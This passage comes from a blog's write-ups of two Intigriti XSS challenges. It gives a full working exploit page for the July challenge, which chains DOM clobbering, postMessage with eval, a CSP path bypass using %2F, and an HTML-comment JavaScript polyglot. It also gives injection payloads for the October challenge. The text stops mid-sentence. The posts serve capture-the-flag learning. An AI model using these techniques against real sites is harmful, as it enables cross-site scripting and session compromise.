src=x>&lt;/textarea> &lt;/div> &lt;/div> &lt;/div> Other than the commented-out variable, there doesn’t seem to be anything special. htmledit.php&lt;!-- &amp;lt;img src=x&amp;gt; --> &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"UTF-8\"> &lt;title>Native HTML editor&lt;/title> &lt;script nonce=\"d8f00e6635e69bafbf1210ff32f96bdb\"> window.addEventListener('error', function(e)&#123; let obj = &#123;type:'err'&#125;; if (e.message)&#123; obj.text = e.message; &#125; else &#123; obj.text = `Exception called on $&#123;e.target.outerHTML&#125;`; &#125; top.postMessage(&#123;fromIframe:obj&#125;, '*'); &#125;, true); onmessage=(e)=>&#123; top.postMessage(&#123;fromIframe:e.data&#125;, '*') &#125; &lt;/script> &lt;/head> &lt;body> &lt;img src=x>&lt;/body> &lt;/html> &lt;!-- /* Page loaded in 0.000024 seconds */ --> This page directly displays the contents of the query string code on the page, and there is a mysterious comment at the beginning that encodes the content after code encoding. But even though it’s displayed on the page, it can’t be executed because of strict CSP: script-src &#39;nonce-...&#39;;frame-src https:;object-src &#39;none&#39;;base-uri &#39;none&#39;; However, the frame-src is specially opened in the CSP, and when I saw this, I thought, “This might be a hint that we need to use an iframe.” console.php&lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"UTF-8\"> &lt;script nonce=\"c4936ad76292ee7100ecb9d72054e71f\"> name = 'Console' document.title = name; if (top === window)&#123; document.head.parentNode.remove(); // hide code if not on iframe &#125; &lt;/script> &lt;style> body, ul &#123; margin:0; padding:0; &#125; ul#console &#123; background: lightyellow; list-style-type: none; font-family: 'Roboto Mono', monospace; font-size: 14px; line-height: 25px; &#125; ul#console li &#123; border-bottom: solid 1px #80808038; padding-left: 5px; &#125; &lt;/style> &lt;/head> &lt;body> &lt;ul id=\"console\">&lt;/ul> &lt;script nonce=\"c4936ad76292ee7100ecb9d72054e71f\"> let a = (s) => s.anchor(s); let s = (s) => s.normalize('NFC'); let u = (s) => unescape(s); let t = (s) => s.toString(0x16); let parse = (e) => (typeof e === 'string') ? s(e) : JSON.stringify(e, null, 4); // make object look like string let log = (prefix, data, type='info', safe=false) => &#123; let line = document.createElement(\"li\"); let prefix_tag = document.createElement(\"span\"); let text_tag = document.createElement(\"span\"); switch (type)&#123; case 'info':&#123; line.style.backgroundColor = 'lightcyan'; break; &#125; case 'success':&#123; line.style.backgroundColor = 'lightgreen'; break; &#125; case 'warn':&#123; line.style.backgroundColor = 'lightyellow'; break; &#125; case 'err':&#123; line.style.backgroundColor = 'lightpink'; break; &#125; default:&#123; line.style.backgroundColor = 'lightcyan'; &#125; &#125; data = parse(data); if (!safe)&#123; data = data.replace(/&lt;/g, '&amp;lt;'); &#125; prefix_tag.innerHTML = prefix; text_tag.innerHTML = data; line.appendChild(prefix_tag); line.appendChild(text_tag); document.querySelector('#console').appendChild(line); &#125; log('Connection status: ', window.navigator.onLine?\"Online\":\"Offline\") onmessage = e => &#123; switch (e.data.cmd) &#123; case \"log\": &#123; log(\"[log]: \", e.data.message.text, type=e.data.message.type); break; &#125; case \"anchor\": &#123; log(\"[anchor]: \", s(a(u(e.data.message))), type='info') break; &#125; case \"clear\": &#123; document.querySelector('#console').innerHTML = \"\"; break; &#125; default: &#123; log(\"[???]: \", `Wrong command received: \"$&#123;e.data.cmd&#125;\"`) &#125; &#125; &#125; &lt;/script> &lt;script nonce=\"c4936ad76292ee7100ecb9d72054e71f\"> try &#123; if (!top.DEV) throw new Error('Production build!'); let checkCredentials = (username, password) => &#123; try&#123; let users = top.store.users; let access = [users.admin, users.moderator, users.manager]; if (!users || !password) return false; for (x of access) &#123; if (x.username === username &amp;&amp; x.password === password) return true &#125; &#125; catch &#123; return false &#125; return false &#125; let _onmessage = onmessage; onmessage = e => &#123; let m = e.data; if (!m.credentials || !checkCredentials(m.credentials.username, m.credentials.password)) &#123; return; // do nothing if unauthorized &#125; switch(m.cmd)&#123; case \"ping\": &#123; // check the connection e.source.postMessage(&#123;message:'pong'&#125;,'*'); break; &#125; case \"logv\": &#123; // display variable's value by its name log(\"[logv]: \", window[m.message], safe=false, type='info'); break; &#125; case \"compare\": &#123; // compare variable's value to a given one log(\"[compare]: \", (window[m.message.variable] === m.message.value), safe=true, type='info'); break; &#125; case \"reassign\": &#123; // change variable's value let o = m.message; try &#123; let RegExp = /^[s-zA-Z-+0-9]+$/; if (!RegExp.test(o.a) || !RegExp.test(o.b)) &#123; throw new Error('Invalid input given!'); &#125; eval(`$&#123;o.a&#125;=$&#123;o.b&#125;`); log(\"[reassign]: \", `Value of \"$&#123;o.a&#125;\" was changed to \"$&#123;o.b&#125;\"`, type='warn'); &#125; catch (err) &#123; log(\"[reassign]: \", `Error changing value ($&#123;err.message&#125;)`, type='err'); &#125; break; &#125; default: &#123; _onmessage(e); // keep default functions &#125; &#125; &#125; &#125; catch &#123; // hide this script on production document.currentScript.remove(); &#125; &lt;/script> &lt;script src=\"./analytics/main.js?t=1627610836\">&lt;/script> &lt;/body> &lt;/html> This page has a lot more code than the other two pages, and we can find some things we need, such as eval: let _onmessage = onmessage; onmessage = e => &#123; let m = e.data; if (!m.credentials || !checkCredentials(m.credentials.username, m.credentials.password)) &#123; return; // do nothing if unauthorized &#125; switch(m.cmd)&#123; // ... case \"reassign\": &#123; // change variable's value let o = m.message; try &#123; let RegExp = /^[s-zA-Z-+0-9]+$/; if (!RegExp.test(o.a) || !RegExp.test(o.b)) &#123; throw new Error('Invalid input given!'); &#125; eval(`$&#123;o.a&#125;=$&#123;o.b&#125;`); log(\"[reassign]: \", `Value of \"$&#123;o.a&#125;\" was changed to \"$&#123;o.b&#125;\"`, type='warn'); &#125; catch (err) &#123; log(\"[reassign]: \", `Error changing value ($&#123;err.message&#125;)`, type='err'); &#125; break; &#125; default: &#123; _onmessage(e); // keep default functions &#125; &#125; &#125; But this eval seems unable to execute the code we want directly because the rules are quite strict (uppercase letters, some lowercase letters, numbers, and + -), so it may have other uses. Another possible place is here: let log = (prefix, data, type='info', safe=false) => &#123; let line = document.createElement(\"li\"); let prefix_tag = document.createElement(\"span\"); let text_tag = document.createElement(\"span\"); switch (type)&#123; // not important &#125; data = parse(data); if (!safe)&#123; data = data.replace(/&lt;/g, '&amp;lt;'); &#125; prefix_tag.innerHTML = prefix; text_tag.innerHTML = data; line.appendChild(prefix_tag); line.appendChild(text_tag); document.querySelector('#console').appendChild(line); &#125; If safe is true, data will not be escaped, and any HTML can be inserted to achieve XSS. It’s worth noting the function’s parameter section: let log = (prefix, data, type=&#39;info&#39;, safe=false), which deserves special explanation. In some programming languages, named parameters are supported, and when calling a function, parameters can be passed by name, such as log(prefix=&#39;a&#39;, safe=true), which passes the corresponding parameters. However, there is no such thing in JS, and the correspondence of parameters is entirely determined by “order.” For example, log(&quot;[logv]: &quot;, window[m.message], safe=false, type=&#39;info&#39;); corresponds to the following parameters: prefix: &quot;[logv]: &quot; data: window[m.message] type: false safe: &#39;info&#39; It is based on the order rather than the name, which is also a common confusion for many beginners. Anyway, let’s start from the log function and work our way back. To execute this section, we need to post a message to this window and meet some conditions. Level 1: Successfully post a messageThere are some conditions on this console.php page. If these conditions are not met, we cannot execute the log function. First, this page must be embedded in an iframe: name = 'Console' document.title = name; if (top === window)&#123; document.head.parentNode.remove(); // hide code if not on iframe &#125; Then there are these checks to pass: try &#123; if (!top.DEV) throw new Error('Production build!'); let checkCredentials = (username, password) => &#123; try&#123; let users = top.store.users; let access = [users.admin, users.moderator, users.manager]; if (!users || !password) return false; for (x of access) &#123; if (x.username === username &amp;&amp; x.password === password) return true &#125; &#125; catch &#123; return false &#125; return false &#125; let _onmessage = onmessage; onmessage = e => &#123; let m = e.data; if (!m.credentials || !checkCredentials(m.credentials.username, m.credentials.password)) &#123; return; // do nothing if unauthorized &#125; // ... &#125; &#125; catch &#123; // hide this script on production document.currentScript.remove(); &#125; top.DEV must be truthy, and the credentials passed in must match top.store.users.admin.username and top.store.users.admin.password. So should I write my own page and set these global variables? Unfortunately, due to the existence of Same Origin Policy, you can only access the contents of windows under the same origin page. Therefore, if you embed console.php in a page you wrote yourself, an error will occur when accessing top.DEV. So we need a same-origin page that allows us to set some things. And this page is obviously htmledit.php, which allows us to insert some HTML. DOM clobberingHow do we set global variables without executing JS? Yes, it’s DOM clobbering. For example, if you have a &lt;div id=&quot;a&quot;&gt;&lt;/div&gt;, in JS you can use window.a or a to access the DOM of this div. If you are not familiar with DOM clobbering, you can refer to my previous article A Brief Discussion on the Principle and Application of DOM Clobbering, or this one is also well written: Expanding XSS with Dom Clobbering If you want to achieve multi-level variable setting, you need to use iframe with srcdoc: &lt;a id=\"DEV\">&lt;/a> &lt;iframe name=\"store\" srcdoc=' &lt;a id=\"users\">&lt;/a> &lt;a id=\"users\" name=\"admin\" href=\"ftp://a:a@a\">&lt;/a> '> &lt;/iframe> &lt;iframe name=\"iframeConsole\" src=\"https://challenge-0721.intigriti.io/console.php\">&lt;/iframe> Here we also use a feature that the username attribute of the a element will be the username in the href attribute URL. In this way, top.DEV will be the DOM of a id=&quot;DEV&quot;&gt;&lt;/a&gt;, and store.users will be an HTMLCollection. store.users.admin is that a, and store.users.admin.username will be the username in href, which is a, and the password is the same. In summary, I can write my own HTML and use window.open to open htmledit.php and bring the above content into it: &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"utf-8\"> &lt;title>XSS POC&lt;/title> &lt;/head> &lt;body> &lt;script> const htmlUrl = 'https://challenge-0721.intigriti.io/htmledit.php?code=' const payload = ` &lt;a id=\"DEV\">&lt;/a> &lt;iframe name=\"store\" srcdoc=' &lt;a id=\"users\">&lt;/a> &lt;a id=\"users\" name=\"admin\" href=\"ftp://a:a@a\">&lt;/a> '>&lt;/iframe> &lt;iframe name=\"iframeConsole\" src=\"https://challenge-0721.intigriti.io/console.php\">&lt;/iframe> ` var win = window.open(htmlUrl + encodeURIComponent(payload)) // wait unitl window loaded setTimeout(() => &#123; console.log('go') const credentials = &#123; username: 'a', password: 'a' &#125; win.frames[1].postMessage(&#123; cmd: 'test', credentials &#125;, '*') &#125;, 5000) &lt;/script> &lt;/body> &lt;/html> In this way, I can use postMessage to send messages in. Although it took some effort, this is just the beginning. Level 2: Make safe trueTo make safe true, so that &lt; will not be escaped when calling log, we need to find a call that passes in four parameters, because the fourth one will be the value of safe: case \"logv\": &#123; // display variable's value by its name log(\"[logv]: \", window[m.message], safe=false, type='info'); break; &#125; case \"compare\": &#123; // compare variable's value to a given one log(\"[compare]: \", (window[m.message.variable] === m.message.value), safe=true, type='info'); break; &#125; log(&quot;[logv]: &quot;, window[m.message], safe=false, type=&#39;info&#39;) is the function call I’m looking for, and the second parameter in it will be window[m.message], which means that any global variable can be passed in as data. But what should be passed in? Level 3: Find the variables that can be passed inI’ve been stuck here for a long time because I can’t think of what can be passed in here. There used to be a trick to pass in name, but this webpage has already set its own name so it cannot be used. Another trick is to use URL to pass in and put things on location, but log will check whether data is a string. If it is not, it needs to be passed through JSON.stringify, which will encode the content. I had to keep repeating and looking at the code to see if I could find something new, and I really did. The following code has a common problem for beginners. Can you see it? let checkCredentials = (username, password) => &#123; try&#123; let users = top.store.users; let access = [users.admin, users.moderator, users.manager]; if (!users || !password) return false; for (x of access) &#123; if (x.username === username &amp;&amp; x.password === password) return true &#125; &#125; catch &#123; return false &#125; return false &#125; The problem lies in for (x of access) &#123;, where x was not declared, so it defaults to a global variable. Here, x will be top.store.users.admin, which is the &lt;a&gt; we set ourselves. Level 4: Bypassing Type CheckNow that we have x, we can pass it into the log function using the logv command. Since safe is true, we can directly display the contents of x using innerHTML. If you convert an a element to a string, you will get the contents of a.href, so we can put our payload in href. However, log checks the type of data, and a is not a string, so it fails the check. What should we do? At this point, I looked back at the code and found this command: case \"reassign\": &#123; // change variable's value let o = m.message; try &#123; let RegExp = /^[s-zA-Z-+0-9]+$/; if (!RegExp.test(o.a) || !RegExp.test(o.b)) &#123; throw new Error('Invalid input given!'); &#125; eval(`$&#123;o.a&#125;=$&#123;o.b&#125;`); log(\"[reassign]: \", `Value of \"$&#123;o.a&#125;\" was changed to \"$&#123;o.b&#125;\"`, type='warn'); &#125; catch (err) &#123; log(\"[reassign]: \", `Error changing value ($&#123;err.message&#125;)`, type='err'); &#125; break; &#125; I can do this: win.frames[1].postMessage(&#123; cmd: 'reassign', message:&#123; a: 'Z', b: 'x+1' &#125;, credentials &#125;, '*') This is equivalent to Z=x+1, and when x+1 is automatically converted to a string, Z will be a string containing our payload. Level 5: Bypassing EncodeAlthough we can now pass in a string, there is still one thing to do. The contents of href are URL-encoded, so &lt; becomes %3C: var a = document.createElement('a') a.setAttribute('href', 'ftp://a:a@a#&lt;img src=x onload=alert(1)>') console.log(a+1) // ftp://a:a@a/#%3Cimg%20src=x%20onload=alert(1)%3E1 What should we do now? In log, there is a line that says data = parse(data), and the code for parse is like this: let parse = (e) => (typeof e === 'string') ? s(e) : JSON.stringify(e, null, 4); // make object look like string If e is a string, it returns s(e), and s is another function. When I was looking at the code, I noticed the rules for eval checking at the reassign part: RegExp = /^[s-zA-Z-+0-9]+$/;, and these four functions: let a = (s) => s.anchor(s); let s = (s) => s.normalize('NFC'); let u = (s) => unescape(s); let t = (s) => s.toString(0x16); Among them, s, u, and t are allowed, which means that they can be swapped using the reassign command! We can replace s with u, so that data will be unescaped! So the final code will look like this: const htmlUrl = 'https://challenge-0721.intigriti.io/htmledit.php?code=' const insertPayload=`&lt;img src=x onerror=alert(1)>` const payload = ` &lt;a id=\"DEV\">&lt;/a> &lt;iframe name=\"store\" srcdoc=' &lt;a id=\"users\">&lt;/a> &lt;a id=\"users\" name=\"admin\" href=\"ftp://a:a@a#$&#123;escape(insertPayload)&#125;\">&lt;/a> '>&lt;/iframe> &lt;iframe name=\"iframeConsole\" src=\"https://challenge-0721.intigriti.io/console.php\">&lt;/iframe> ` var win = window.open(htmlUrl + encodeURIComponent(payload)) // 等待 window 載入完成 setTimeout(() => &#123; console.log('go') const credentials = &#123; username: 'a', password: 'a' &#125; // s=u win.frames[1].postMessage(&#123; cmd: 'reassign', message:&#123; a: 's', b: 'u' &#125;, credentials &#125;, '*') // Z=x+1 so Z = x.href + 1 win.frames[1].postMessage(&#123; cmd: 'reassign', message:&#123; a: 'Z', b: 'x+1' &#125;, credentials &#125;, '*') // log window[Z] win.frames[1].postMessage(&#123; cmd: 'logv', message: 'Z', credentials &#125;, '*') &#125;, 5000) So data will be ftp://a:a@a#&lt;img src=x onerror=alert(1)&gt;, and it will be set to HTML, triggering XSS! No, things are not that easy… I forgot about CSP. Level 6: Bypassing CSPAlthough I can insert any HTML, unfortunately, this webpage also has CSP: script-src &#39;nonce-xxx&#39; https:&#x2F;&#x2F;challenge-0721.intigriti.io&#x2F;analytics&#x2F; &#39;unsafe-eval&#39;; frame-src https:; object-src &#39;none&#39;;base-uri &#39;none&#39;; Since there is no unsafe-inline, our previous payload is invalid. In this CSP, https://challenge-0721.intigriti.io/analytics/ is obviously a suspicious path. This page actually imports a file called https://challenge-0721.intigriti.io/analytics/main.js, but it has nothing in it, just some comments. When I saw this, I knew how to do it, because I had learned a technique to bypass CSP before, using %2F (encoded /) and the inconsistency between URL parsing on the front and back ends. Taking https://challenge-0721.intigriti.io/analytics/..%2fhtmledit.php as an example, for the browser, this URL is under /analytics, so it can pass the CSP check. But for the server, this segment is actually https://challenge-0721.intigriti.io/analytics/../htmledit.php, which is https://challenge-0721.intigriti.io/htmledit.php. So we successfully bypassed CSP and loaded files from different paths! Therefore, the goal now is to find a file where we can put JS code. Looking around, only htmledit.php seems to work, but isn’t it an HTML? Level 7: Constructing JS CodeIf you still remember, there is an HTML comment at the beginning of this page: &lt;!-- &amp;lt;img src=x&amp;gt; --> .... In some cases, this syntax is actually a comment in JS. It’s not me saying it, it’s in the specification: In other words, we can take advantage of this and create a file that looks like HTML but is actually valid JS! The URL I finally came up with is: https://challenge-0721.intigriti.io/htmledit.php?code=1;%0atop.alert(document.domain);/* The generated HTML looks like this: &lt;!-- 1; 這邊都是註解 top.alert(document.domain);/* --> 這之後也都是註解了 &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> ... The first line is a comment, and everything after /* is also a comment, so this entire section is actually just top.alert(document.domain);. However, it’s worth noting that the content type of htmledit.php doesn’t change and is still text/html. The reason we can import it as JS is because of the same origin relationship. If you import an HTML file from a different origin as JS, it will be blocked by CORB. At this point, we can make data equal to &lt;script src=&quot;https://challenge-0721.intigriti.io/htmledit.php?code=1;%0atop.alert(document.domain);/*&quot;&gt;&lt;/script&gt;, and it will execute when text_tag.innerHTML = data is called, bypassing CSP and successfully inserting the script into the page! But unfortunately, we’re not quite there yet… Level 8: Executing dynamically inserted scriptsJust when I thought I was about to pass the level, I found that my script wouldn’t execute no matter what I did. I looked up some keywords and found out that if you insert a script tag using innerHTML, it won’t execute. I tried searching for solutions using keywords like innerhtml import script or innerhtml script run, but I couldn’t find anything. Finally, I thought of trying &lt;iframe srcdoc=&quot;...&quot;&gt;. It was a bit of a long shot, but I figured I might as well try it since I had nothing to lose. As it turns out, it worked. If the content is &lt;iframe srcdoc=&quot;&lt;script src=&#39;...&#39;&gt;&lt;/script&gt;&quot;, it will load the script directly. Final solutionOne last thing to note is that before submitting my answer, I found that my answer wouldn’t work on Firefox. The reason is this piece of code: &lt;a id=\"users\">&lt;/a> &lt;a id=\"users\" name=\"admin\" href=\"a\">&lt;/a> In Chrome, window.users will be an HTMLCollection, but in Firefox, it will only get one a element, and window.users.admin will be undefined. However, this isn’t a big problem. You can solve it by adding another layer of iframe: &lt;iframe name=\"store\" srcdoc=\" &lt;iframe srcdoc='&lt;a id=admin href=ftp://a:a@a#>&lt;/a>' name=users> \"> &lt;/iframe> My final answer looks like this: &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"utf-8\"> &lt;title>XSS POC&lt;/title> &lt;/head> &lt;body> &lt;script> const htmlUrl = 'https://challenge-0721.intigriti.io/htmledit.php?code=' const exploitSrc = '/analytics/..%2fhtmledit.php?code=1;%0atop.alert(document.domain);/*' const insertPayload=`&lt;iframe srcdoc=\"&lt;script src=$&#123;exploitSrc&#125;>&lt;\\/script>\">` const payload = ` &lt;a id=\"DEV\">&lt;/a> &lt;iframe name=\"store\" srcdoc=\" &lt;iframe srcdoc='&lt;a id=admin href=ftp://a:a@a#$&#123;escape(insertPayload)&#125;>&lt;/a>' name=users> \"> &lt;/iframe> &lt;iframe name=\"iframeConsole\" src=\"https://challenge-0721.intigriti.io/console.php\">&lt;/iframe> ` var win = window.open(htmlUrl + encodeURIComponent(payload)) // wait for 3s to let window loaded setTimeout(() => &#123; const credentials = &#123; username: 'a', password: 'a' &#125; win.frames[1].postMessage(&#123; cmd: 'reassign', message:&#123; a: 's', b: 'u' &#125;, credentials &#125;, '*') win.frames[1].postMessage(&#123; cmd: 'reassign', message:&#123; a: 'Z', b: 'x+1' &#125;, credentials &#125;, '*') win.frames[1].postMessage(&#123; cmd: 'logv', message: 'Z', credentials &#125;, '*') &#125;, 3000) &lt;/script> &lt;/body> &lt;/html> Other solutionsMy method was to open a new window to post a message, but you can also embed yourself as an iframe and let htmledit.php embed it. In this case, you can also use top.postMessage to send messages. Embedding yourself in another webpage is something I often forget. Another unexpected solution is based on this piece of code: case \"log\": &#123; log(\"[log]: \", e.data.message.text, type=e.data.message.type); break; &#125; The key point here is type=e.data.message.type, which sets a global variable called type. Therefore, you can pass in any payload through this and then call logv. This eliminates the need to handle the payload in the a tag. SummaryI really like this challenge because it feels like a series of levels that you have to pass one by one. Every time I thought I was about to pass a level, I would get stuck again, until I finally solved all the levels and successfully executed XSS. From this challenge, you can learn the following frontend knowledge: DOM clobbering JS comments are not just // and /* */ Bypassing CSP for paths Scripts added with innerHTML won’t execute You can use iframe srcdoc to bypass this (but in general, you should add a script tag and append it) From this topic, you can learn or review many skills. The interesting point of CTF and this type of challenge is here. Although you may know everything separately, it is very challenging to carefully string them together, which tests experience and skills. If you are interested in XSS challenges, you can follow Intigriti and wait for the next challenge.","link":"/2021/08/06/en/intigriti-xss-0721/"},{"title":"Learning HTML Again from Intigriti's October XSS Challenge","text":"IntroductionI have introduced Intigriti’s XSS challenge many times before, so I won’t go into detail this time. If you are interested, you can refer to my previous articles. The focus of this article will be on their October challenge, which is not difficult. After spending about one or two days to solve it, I didn’t touch it anymore. I decided to write this article because after the challenge ended, I saw many unexpected solutions, so I wanted to record them in an article. About the ChallengeFirst, let me briefly explain what this challenge is about. The core code is as follows: window.addEventListener(\"DOMContentLoaded\", function () &#123; e = `)]&#125;'` + new URL(location.href).searchParams.get(\"xss\"); c = document.getElementById(\"body\").lastElementChild; if (c.id === \"intigriti\") &#123; l = c.lastElementChild; i = l.innerHTML.trim(); f = i.substr(i.length - 4); e = f + e; &#125; let s = document.createElement(\"script\"); s.type = \"text/javascript\"; s.appendChild(document.createTextNode(e)); document.body.appendChild(s); &#125;); First, a string e will be thrown into the script tag. As long as e becomes a valid JS code and calls alert(document.domain), you win. The default content of e is a strange string: )]&#125;&#39; plus the value of xss on the query string. Next is the essence of this question. It will first check whether the id of the lastElementChild of the body is intigriti. If so, it will take the last four characters of the innerHTML of this element and put them in front of e. Let’s call these four characters last4. Then e will be &#123;last4&#125;)]&#125;&#39;&#123;qs&#125;, and the goal is to make this whole paragraph a valid code. As for qs, there is no problem because it can be controlled by ourselves. The key is the last4. My initial idea was simple. If the beginning of last4 is &#39;, then the front will become a string, and combined with qs, it can become a valid code, like this: &#39;xxx)]&#125;&#39;;alert(1). The problem is, how to control last4? This depends on another place where HTML injection can be done in the question. &lt;div id=\"html\" class=\"text\">&lt;h1 class=\"light\"> here &lt;/div> &lt;!-- !!! --> &lt;div class=\"a\">'\"&lt;/div> &lt;/body> &lt;div id=\"container\"> &lt;span>I&lt;/span> &lt;span id=\"extra-flicker\">N&lt;/span> &lt;span>T&lt;/span> &lt;span>I&lt;/span> &lt;div id=\"broken\"> &lt;span id=\"y\">G&lt;/span> &lt;/div> &lt;span>R&lt;/span> &lt;div id=\"broken\"> &lt;span id=\"y\">I&lt;/span> &lt;/div> &lt;span>T&lt;/span> &lt;span>I&lt;/span> &lt;/div> The last part of the question’s HTML looks like this, and we can control the value of here, so we can inject any HTML into it (but it is useless to directly do XSS because of CSP). Under the current situation, the lastElementChild of the body will be container. So our first challenge is to find a way to change lastElementChild. Automatic Correction of HTMLAlthough it seems that the situation is irreversible and we cannot change the last element, in fact, we can wrap the entire paragraph in a div tag without a closing tag, like this: &lt;div id=\"html\" class=\"text\">&lt;h1 class=\"light\"> &lt;!-- 底下是注入的值 --> &lt;/h1> &lt;!-- 關閉前面的 h1 --> &lt;/div> &lt;!-- 關閉 id=html 的 div --> &lt;div id=intigriti> &lt;!-- 建立一個沒有關閉標籤的 div --> &lt;div> &lt;!-- 關閉下面那個 div，沒有這個的話上面的 intigriti 就被關閉了 --> &lt;!-- 上面是注入的值 --> &lt;/div> &lt;!-- !!! --> &lt;div class=\"a\">'\"&lt;/div> &lt;/body> &lt;div id=\"container\"> &lt;span>I&lt;/span> &lt;span id=\"extra-flicker\">N&lt;/span> &lt;span>T&lt;/span> &lt;span>I&lt;/span> &lt;div id=\"broken\"> &lt;span id=\"y\">G&lt;/span> &lt;/div> &lt;span>R&lt;/span> &lt;div id=\"broken\"> &lt;span id=\"y\">I&lt;/span> &lt;/div> &lt;span>T&lt;/span> &lt;span>I&lt;/span> &lt;/div> After formatting, it will look like this: &lt;div id=\"html\" class=\"text\"> &lt;h1 class=\"light\">&lt;/h1> &lt;/div> &lt;div id=intigriti> &lt;div>&lt;/div> &lt;!-- !!! --> &lt;div class=\"a\">'\"&lt;/div> &lt;/body> &lt;div id=\"container\"> &lt;span>I&lt;/span> &lt;span id=\"extra-flicker\">N&lt;/span> &lt;span>T&lt;/span> &lt;span>I&lt;/span> &lt;div id=\"broken\"> &lt;span id=\"y\">G&lt;/span> &lt;/div> &lt;span>R&lt;/span> &lt;div id=\"broken\"> &lt;span id=\"y\">I&lt;/span> &lt;/div> &lt;span>T&lt;/span> &lt;span>I&lt;/span> &lt;/div> The DOM structure is like this: You will clearly see that container is wrapped, and it doesn’t matter that there is no closing tag, because the browser will automatically repair it for us, it’s that magical. However, as it is now, the lastElementChild of intigriti will be &lt;div id=container&gt;, and the last four characters of its innerHTML will be pan&gt;, which cannot form a valid code, so we need to find a way to control the last four characters. Control last4This is where I got stuck the longest, because I was always stuck on trying to control the “content” and trying to add content, but due to the structure, I couldn’t make the added content the last child. But later, I suddenly broke through the blind spot and thought that I didn’t need to control the content, just control the tag! We can wrap it twice again, like this: &lt;div id=\"html\" class=\"text\"> &lt;h1 class=\"light\">&lt;/h1> &lt;/div> &lt;div id=intigriti> &lt;test1> &lt;test2> &lt;div>&lt;/div> &lt;div class=\"a\">'\"&lt;/div> &lt;/body> &lt;div id=\"container\"> &lt;span>I&lt;/span> &lt;span id=\"extra-flicker\">N&lt;/span> &lt;span>T&lt;/span> &lt;span>I&lt;/span> &lt;div id=\"broken\"> &lt;span id=\"y\">G&lt;/span> &lt;/div> &lt;span>R&lt;/span> &lt;div id=\"broken\"> &lt;span id=\"y\">I&lt;/span> &lt;/div> &lt;span>T&lt;/span> &lt;span>I&lt;/span> &lt;/div> The structure will become like this: In this way, the last child of intigriti will become test1, its innerHTML will become test2, and the last four characters will become st2&gt;. Here, we use the custom tag plus the property that the browser will automatically close to control the last four characters. So as long as we change &lt;test2&gt; to &lt;tes&#39;t2&gt;, last4 will become &#39;t2&gt;, starting with a single quote, achieving our goal. Then set xss to ;alert(document.domain), and we’re done: Unexpected SolutionsAfter I solved this question in the way mentioned above, I thought I was done, and I didn’t expect there to be other solutions (I was too naive). It wasn’t until the official release of other people’s writeups that I realized that I was really a frog at the bottom of a well. I wanted to write this post because unexpected solutions can teach us something new. Let’s take a look at each of them. Utilizing the Special Behavior of HTML TagsThe following technique was learned from @svennergr. When I was solving this problem, the reason why I finally wrapped it with tags outside was that if I didn’t do this, I couldn’t control the lastElementChild under intigriti, which would become the container div. However, some HTML tag behaviors can break this deadlock. For example, the magical &lt;select&gt; tag. We pass in our payload: &lt;/h1&gt;&lt;/div&gt;&lt;div id=intigriti&gt;&lt;select&gt;, and the HTML will be like this: &lt;div id=\"html\" class=\"text\"> &lt;h1 class=\"light\">&lt;/h1> &lt;/div> &lt;div id=intigriti> &lt;select> &lt;/div> &lt;div class=\"a\">'\"&lt;/div> &lt;/body> &lt;div id=\"container\"> &lt;span>I&lt;/span> &lt;span id=\"extra-flicker\">N&lt;/span> &lt;span>T&lt;/span> &lt;span>I&lt;/span> &lt;div id=\"broken\"> &lt;span id=\"y\">G&lt;/span> &lt;/div> &lt;span>R&lt;/span> &lt;div id=\"broken\"> &lt;span id=\"y\">I&lt;/span> &lt;/div> &lt;span>T&lt;/span> &lt;span>I&lt;/span> &lt;/div> Guess what it became in the end? All the tags inside the select disappeared! And lastElementChild takes an element, not a node, so if we add an option, it will become the only element. Then we replace &lt;div id=intigriti&gt; with &lt;select id=intigriti&gt;, and it will look like this: In this way, we successfully controlled the content of lastElementChild and achieved what I thought was impossible! Another magical element is called table. Our code looks like this, and the payload is &lt;/h1&gt;&lt;/div&gt;&lt;table id=intigriti&gt;&lt;tbody&gt;: &lt;div id=\"html\" class=\"text\"> &lt;h1 class=\"light\">&lt;/h1> &lt;/div> &lt;table id=intigriti> &lt;tbody> &lt;/div> &lt;div class=\"a\">'\"&lt;/div> &lt;/body> &lt;div id=\"container\"> &lt;span>I&lt;/span> &lt;span id=\"extra-flicker\">N&lt;/span> &lt;span>T&lt;/span> &lt;span>I&lt;/span> &lt;div id=\"broken\"> &lt;span id=\"y\">G&lt;/span> &lt;/div> &lt;span>R&lt;/span> &lt;div id=\"broken\"> &lt;span id=\"y\">I&lt;/span> &lt;/div> &lt;span>T&lt;/span> &lt;span>I&lt;/span> &lt;/div> But when it is rendered, the table becomes the last element by itself: I actually tried it out, and elements that are inside but not belonging to the table can be used, for example: &lt;body> &lt;table> &lt;tr>&lt;div>123&lt;/div>&lt;/tr> &lt;h1>last&lt;/h1> &lt;/body> After being placed on the DOM, it becomes: &lt;body> &lt;div>123&lt;/div> &lt;h1>last&lt;/h1> &lt;table> &lt;tbody> &lt;tr>&lt;/tr> &lt;/tbody> &lt;/table> &lt;/body> And if we have a comment &lt;!-- --&gt; inside the tr, it can also be brought into the tr (using td is also possible). What’s even more amazing is that in the intigriti table case, the content is &lt;!-- !!! --&gt;, right? So the last four characters are --&gt;, which is actually a JS comment. In the July challenge, we learned that &lt;!-- is a comment, but I didn’t expect that --&gt; is also a comment. It’s really eye-opening. And the original article also compiled a list, running through each tag to see which ones can appear inside &lt;select&gt; and &lt;table&gt;. It seems that &lt;script&gt;, &lt;style&gt;, and &lt;template&gt; can all appear inside without being removed. DOM ClobberingThis solution comes from @airispoison, which I think is a very creative solution. His payload is: ?html=&lt;/div>&lt;form id=intigriti>&lt;button id=lastElementChild>/*&lt;/button>&amp;xss=*/alert(document.domain) He was hacking this part: c = document.getElementById(\"body\").lastElementChild; // 會拿到 &lt;form id=intigriti> if (c.id === \"intigriti\") &#123; l = c.lastElementChild; // 這邊拿到的會是 &lt;button id=lastElementChild>，而不是真的 lastElementChild！ i = l.innerHTML.trim(); f = i.substr(i.length - 4); e = f + e; &#125; The clever part of this solution is that lastElementChild should originally get the lastElementChild on the DOM, but because it was clobbered by DOM clobbering, it got the button with the id lastElementChild! In this way, innerHTML can be controlled, and any value can be passed in to form legal JS. Speaking of legal JS, let’s take a look at which methods can be used to form legal JS. Forming Legal JSAssuming we have a string: )]&#125;&#39;, we can add up to four characters in front 